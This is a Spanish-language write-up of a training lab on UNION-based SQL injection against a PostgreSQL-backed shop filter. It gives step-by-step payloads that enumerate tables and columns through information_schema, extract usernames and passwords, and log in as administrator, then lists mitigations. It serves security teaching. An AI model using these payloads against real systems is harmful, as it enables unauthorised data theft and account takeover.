Lab 5

SQL Injection attack, listing the database contents on non-Oracle databases

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: UNION-based SQL Injection (In-band)

Objetivo

Enumerar el contenido de la base de datos explotando una vulnerabilidad SQL Injection en el parámetro category del filtro de productos.

El objetivo es identificar la tabla que almacena credenciales de usuarios, descubrir sus columnas y extraer usernames y passwords para iniciar sesión como administrator.

Vulnerabilidad

La aplicación construye la consulta SQL concatenando directamente el valor del parámetro category. 

SELECT * FROM products WHERE category = 'input'

Esto permite cerrar la cadena original e insertar consultas adicionales mediante UNION SELECT.

El motor de base de datos identificado es PostgreSQL, evidenciado por la presencia de tablas del esquema information_schema.

Procedimiento

Paso 1 – Confirmar SQL Injection

Gifts' UNION SELECT 'abc','def'--

La página mostró "abc" y "def" como productos, confirmando:

  • Vulnerabilidad SQL Injection
  • Dos columnas compatibles con UNION

Paso 2 – Enumerar tablas

Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--

Se identificó la tabla que contiene credenciales: users_wdykho

Paso 3 – Enumerar columnas

Gifts' UNION SELECT column_name, NULL 
FROM information_schema.columns 
WHERE table_name='users_wdykho'--

Se identificaron las columnas relevantes:

  • username_eclowy
  • password_cvzrzx

Paso 4 – Extraer credenciales

Gifts' UNION SELECT password_cvzrzx, username_eclowy FROM users_wdykho--

La respuesta mostró todos los usuarios y contraseñas almacenadas en la base de datos.

Paso 5 – Acceder al sistema

Se utilizó la credencial del usuario administrator para iniciar sesión en la página de login.

Explicación del payload

' UNION SELECT [columna1], [columna2] FROM [tabla]--
  • ' → cierra la cadena original del WHERE
  • UNION SELECT → permite combinar resultados adicionales
  • NULL o valores arbitrarios → mantienen la compatibilidad con las columnas
  • -- → comenta el resto de la consulta original

Esta técnica permite una enumeración progresiva:

metadatos → estructura → datos

Mitigación recomendada

  • Uso obligatorio de consultas parametrizadas.
  • Validación estricta de entradas mediante listas blancas.
  • Aplicar principio de mínimo privilegio.
  • Uso de ORM que gestione consultas seguras.
  • Implementación de WAF.
